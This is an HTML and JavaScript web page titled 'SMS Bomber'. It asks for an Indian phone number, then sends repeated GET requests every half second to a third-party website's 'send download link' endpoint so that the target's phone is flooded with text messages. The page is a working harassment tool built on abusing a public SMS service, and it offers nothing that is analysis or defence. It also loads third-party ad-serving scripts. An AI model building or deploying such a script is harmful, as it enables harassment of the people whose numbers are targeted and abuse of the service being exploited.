
<!DOCTYPE html>
<html>
<head>
<title>Sms Bomber</title>
<style>
html, body {
margin:0;
padding:0;
}
body {
background-color:#333;
color:#fff;
font-family: "Segoe UI";
}
.content {
width:400px;
height:auto;
min-height:100px;
margin:60px auto;
padding:20px;
box-sizing:border-box;
border:2px solid #aaa;
text-align:center;
border-radius:10px;
}
.content h1 {
font-size:26px;
font-weight:normal;
}
.input {
width:300px;
height:40px;
background-color:#222;
font-size:20px;
display:inline-block;
text-align:left;
margin-bottom:4px;
}
.input span {
display:inline-block;
height:40px;
width:40px;
text-align:right;
padding:0px 5px;
line-height:38px;
font-size:18px;
font-weight:400;
}
.input input {
background-color:transparent;
font-size:18px;
border:none;
line-height:40px;
display:inline-block;
vertical-align:top;
padding:0 5px;
margin:0;
width:240px;
color:#fff;
}
input:hover, input:focus {
border:none;
outline:none;
}
input[type=number]::-webkit-inner-spin-button,
input[type=number]::-webkit-outer-spin-button {
-webkit-appearance: none;
margin: 0;
}
.btndiv {
padding:20px 0px;
}
.btn {
color:#fff;
padding:10px 30px;
background-color:#111;
border:none;
border-radius:5px;
}
input.limit {
border:1px solid #555;
width:100px;
height:30px;
border-radius:6px;
/*margin-top:20px;*/
margin-left:50px;
margin-top:5px;
}
@media only screen and (max-width:440px) {
.content {
width:90%;
}
}
</style>
</head>
<body>
<div class="content">
<h1>SMS Bomber</h1>
<form action="index.php" method="post">
<div class="input">
<span>+91</span><input type="number" id="number" placeholder="Enter Number" min="7000000000" max="9999999999" name="number" required>
</div>
<!--<div class="input" align="center">
<input type="number" name="limit" placeholder="SMS Limit" id="limit">
</div>-->
<div class="btndiv">
<input type="button" class="btn" value="Bomb" name="bomb">
</div>
</form>
<p id="resp"></p>
<script
src="https://code.jquery.com/jquery-3.2.1.min.js"
integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
crossorigin="anonymous">
</script>
<script data-cfasync='false' type='text/javascript'
src='//p242361.clksite.com/adServe/banners?tid=242361_460929_6'></script>
<script data-cfasync='false' type='text/javascript'
src='//p242361.clksite.com/adServe/banners?
tid=242361_460929_0&type=footer&size=728x90'>
</script>

<script type="text/javascript">

function bomb() {
;
}

$(".btn").on('click', function() {
var number = $("#number").val();
var limitt = 20;
var url = 'http://www.narendramodi.in/site/senddnldlink?contact_no=91%C2%A0'+number;
var interval, i = 0;
/*
function createCORSRequest(method, url){
var xhr = new XMLHttpRequest();
if ("withCredentials" in xhr){
xhr.open(method, url, true);
} else if (typeof XDomainRequest != "undefined"){
xhr = new XDomainRequest();
xhr.open(method, url);
} else {
xhr = null;
}
return xhr;
}
for(i=1; i <= limitt; i++) {
var request = createCORSRequest("get", url);
if (request){
request.onload = function(){
$("#resp").html("Bomb Succesfull");
console.log('response');
};
request.send();
}
}
*/


//for(i=1; i < limitt; i++) {
interval = setInterval(bombb,500);
//}
function bombb() {
$.ajax({
url: url,
type: 'GET',
crossDomain: true,
async: true,
//dataType: "jsonp",
success: function (response) {
$("#resp").html("Bomb Succesfull");
console.log('response');
}
})
if( i < limitt ) i++;
else clearInterval(interval);
}
/*var interval, i = 0;

function dostuff() {
if(i < 5) i++;
else clearInterval(interval);
}
interval = setInterval(dostuff, 60);*/
});
</script>
</body>
</html>